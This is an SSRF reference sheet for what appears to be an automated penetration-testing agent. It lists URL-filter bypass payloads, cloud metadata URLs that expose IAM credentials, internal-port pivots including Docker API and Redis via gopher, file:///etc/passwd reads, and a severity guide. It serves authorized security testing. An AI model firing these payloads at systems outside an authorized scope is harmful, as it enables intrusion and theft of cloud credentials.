# SSRF — depth reference

Load once `probe_ssrf` confirmed the server fetches a controlled URL and you
need filter bypass, cloud-metadata targets, or internal pivoting. Every
fetched URL still goes through `http_request` — the scope guard applies to
the *first* request; what the server resolves after that is the bug.

## URL-parser bypass table (filters that check host)

| Technique | Payload |
|---|---|
| octal IP | `http://0177.0.0.1`, `http://0177.0.1` |
| hex IP | `http://0x7f.0.0.1`, `http://0x7f000001` |
| decimal IP | `http://2130706433` (127.0.0.1) |
| shortened | `http://127.1`, `http://0` |
| IPv6 | `http://[::1]`, `http://[::ffff:127.0.0.1]` |
| userinfo confusion | `http://allowed.com@127.0.0.1`, `http://127.0.0.1#allowed.com` |
| suffix confusion | `http://allowed.com.evil.com` vs checks that only `endswith`/`contains` |
| redirect | valid URL that 302s to `http://127.0.0.1` — validation runs pre-redirect |
| DNS rebinding | hostname alternating attacker↔127.0.0.1 between validate and fetch |

The redirect and rebinding rows bypass *validate-then-fetch* designs — the
check and the fetch resolve different addresses. Our own client re-checks the
peer IP at connect time precisely because this class exists.

## Cloud metadata (high-value first targets)

| Provider | URL | Notes |
|---|---|---|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` then `…/iam/security-credentials/<role>` | plain GET |
| AWS IMDSv2 | same paths, but needs `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds` first — SSRF usually can't PUT; report IMDSv2-hardened honestly |
| GCP | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` | needs header `Metadata-Flavor: Google` — only works if the SSRF lets you set headers |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | needs `Metadata: true` header |
| DigitalOcean | `http://169.254.169.254/metadata/v1/user-data` | plain GET |

A metadata response with credentials is a critical finding — cite the
recorded response body verbatim; never echo secret values beyond what the
transcript already holds.

## Internal pivot — what to probe once inside

| Port | Service | Cheap probe |
|---|---|---|
| 80/443/8080/8443/3000/5000 | HTTP services | fetch root, banner-diff vs baseline |
| 6379 | Redis | `gopher://` or raw URL only if scheme unchecked |
| 9200 | Elasticsearch | `http://127.0.0.1:9200/_cat/indices` |
| 27017 | MongoDB | banner/timeout difference |
| 3306/5432 | MySQL/Postgres | banner grab, no auth needed for version |
| 2375 | Docker API | `/containers/json` — unauthenticated RCE if open |
| 11211 | memcached | `stats` via gopher |

Open vs closed ports read differently: connection-refused errors are fast
and uniform; open services time out, banner, or return content. Sweep a
small known-port set before claiming "internal network reachable".

## Protocol smuggling (when scheme isn't restricted to http)

- `file:///etc/passwd`, `file:///c:/windows/win.ini` — local file read
- `gopher://127.0.0.1:6379/_INFO` — raw TCP into Redis/memcached/MySQL
- `dict://127.0.0.1:6379/info` — line-based services
- `ftp://`, `ldap://` — parser-confusion edge cases

## Blind SSRF (no response body returned)

Confirmation shifts to: timing differences (open vs filtered port),
error-message differences, or an OOB callback — point the URL at a listener
you control and cite the inbound hit via `note`. A logged DNS hit proves the
fetch happened even when the app shows nothing.

## Severity guide

- Cloud credentials or internal admin plane reached: critical
- Confirmed fetch of loopback/metadata URL, content returned: high
- Blind fetch confirmed only via OOB/timing: medium-high
- Filter exists but bypassed: report the bypass as the finding, not the filter
